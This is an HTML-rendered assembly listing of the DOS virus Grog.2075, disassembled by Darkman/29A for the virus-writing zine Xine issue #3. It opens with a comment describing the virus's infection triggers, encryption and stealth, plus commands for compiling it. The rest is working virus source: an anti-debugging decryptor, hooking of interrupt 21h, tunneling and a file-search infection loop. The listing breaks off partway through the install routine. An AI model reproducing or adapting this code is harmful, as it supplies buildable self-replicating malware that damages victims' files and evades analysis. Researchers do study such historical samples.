<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>grog2075.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 306 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">



</span><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;                  Grog.2075</span><span class="sc0">
</span><span class="sc1">;                Disassembly by</span><span class="sc0">
</span><span class="sc1">;                 Darkman/29A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Grog.2075 is a 2075 bytes parasitic direct action and resident COM/EXE</span><span class="sc0">
</span><span class="sc1">;   virus. Infects files at open file, delete file, get or set file attributes,</span><span class="sc0">
</span><span class="sc1">;   load and/or execute program and extended open/create by prepending the virus</span><span class="sc0">
</span><span class="sc1">;   to the infected COM file and appending to the infected EXE file. Grog.2075</span><span class="sc0">
</span><span class="sc1">;   has an error handler, 8-bit subtract encryption in file, anti-tunneling,</span><span class="sc0">
</span><span class="sc1">;   anti-debugging techniques, interrupt stealth at interrupt 21h, filesize</span><span class="sc0">
</span><span class="sc1">;   stealth, restro structures and tunneling of interrupt 21h. Grog.2075 is</span><span class="sc0">
</span><span class="sc1">;   using the pointer to address of interrupt 13h (disk) handler- and interrupt</span><span class="sc0">
</span><span class="sc1">;   21h (DOS functions) get address of InDOS flag DOS exploits.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To compile Grog.2075 with Turbo Assembler v 4.0 type:</span><span class="sc0">
</span><span class="sc1">;     TASM /m GROG2075.ASM</span><span class="sc0">
</span><span class="sc1">;     TLINK /t /x GROG2075.OBJ</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0">   </span><span class="sc2">100h</span><span class="sc0">              </span><span class="sc1">; Origin of Grog.2075</span><span class="sc0">

</span><span class="sc5">code_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">

         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">          </span><span class="sc1">; Set trap flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;  "   "    "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; DI = offset of interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI =   "    "      "       "     "</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = offset of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = segment of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; SI = offset of segment of interr...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">crypt_begin</span><span class="sc0">  </span><span class="sc1">; SI = offset of crypt_begin</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">    </span><span class="sc1">; AX = offset of decryptor</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = segment of decryptor</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 01h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">          </span><span class="sc1">; Save DX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (DX)</span><span class="sc0">
</span><span class="sc5">decrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of encrypted code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c47h</span><span class="sc0">        </span><span class="sc1">; Terminate with return code</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">decrypt_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">

</span><span class="sc5">decryptor</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Anti-debugging decryptor</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI = pointer to decryptor loop</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of decryptor loop</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc0">         </span><span class="sc1">; LOOP imm8 (opcode 0e2h)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_int21</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to test_int21</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Decrypt byte</span><span class="sc0">
</span><span class="sc5">decrypt_key</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Decryption key</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store byte of decrypted code</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decrypt_exit</span><span class="sc0">
</span><span class="sc5">test_int21</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc0">         </span><span class="sc1">; INT 21h (opcode 0cdh,21h)?</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">decrypt_exit</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to decrypt_exit</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">crypt_begin</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 01h</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; DI = offset of offset of interru...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 01h</span><span class="sc0">
</span><span class="sc5">virus_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">'Gg'</span><span class="sc0">             </span><span class="sc1">; Grog.2075 function</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b47h</span><span class="sc0">        </span><span class="sc1">;     "        "</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2e01h</span><span class="sc0">        </span><span class="sc1">; Set verify flag (on)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Zero DL</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">      </span><span class="sc1">; Get disk transfer area address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">install</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">dta</span><span class="sc0">      </span><span class="sc1">; DX = offset of dta</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_assign</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_comma</span><span class="sc0">    </span><span class="sc1">; ASSIGN not installed? Jump to in...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">601h</span><span class="sc0">         </span><span class="sc1">; Get drive assignment table</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AL = the drive which C: is mappe...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">      </span><span class="sc1">; Mappe drive C: to drive C:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Store drive which C: is mapped to</span><span class="sc0">
</span><span class="sc5">infect_comma</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">c__command_</span><span class="sc0">  </span><span class="sc1">; DX = offset of c__command_</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_assign</span><span class="sc0">
</span><span class="sc5">mov_code_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_first</span><span class="sc0">      </span><span class="sc1">; ASSIGN not installed? Jump to fi...</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; Store drive which C: is mapped to</span><span class="sc0">
</span><span class="sc5">find_first</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">      </span><span class="sc1">; Find first matching file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000000111b</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_specifi</span><span class="sc0">     </span><span class="sc1">; DX = offset of file_specifi</span><span class="sc0">
</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">set_dta_addr</span><span class="sc0">    </span><span class="sc1">; Error? Jump to set_dta_addr</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">        </span><span class="sc1">; Get file attributes</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">      </span><span class="sc1">; Find next matching file</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_next</span><span class="sc0">
</span><span class="sc5">set_dta_addr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">      </span><span class="sc1">; Set disk transfer area address</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_exit</span><span class="sc0">

</span><span class="sc5">test_assign</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test if ASSIGN is installed</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">         </span><span class="sc1">; ASSIGN installation check</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; ASSIGN installed?</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">install</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Tunnel, allocate memory, move vi...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">      </span><span class="sc1">; AX = segment of address of inter...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS =    "    "     "    "     "</span><span class="sc0">
         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0b4h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; ES:BX = pointer to address of in...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">      </span><span class="sc1">; Get address of InDOS flag</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; AX = segment of DOS data segment</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">dos_data_seg</span><span class="sc0">     </span><span class="sc1">; DI = offset of dos_data_seg</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store segment of DOS data segment</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; SI = offset of interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int21_origin</span><span class="sc0">     </span><span class="sc1">; DI = offset of int21_origin</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;  "      "       "     "</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc1">; DI = offset of int21_addr</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">; Get interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;  "      "       "     "</span><span class="sc0">

         </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI = pointer to interrupt 01h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc1">; DI = offset of int01_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; AX = offset of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Get interrupt offset 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = segment of interrupt 01h</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Get interrupt segment 01h</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; DI = offset of interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">tunneler</span><span class="sc0">     </span><span class="sc1">; AX = offset of tunneler</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 01h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 01h</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (flags)</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Set trap flag</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4343h</span><span class="sc0">        </span><span class="sc1">; Unknown function</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_origin</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack (flags)</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">    </span><span class="sc1">; Clear trap flag</span><span class="sc0">
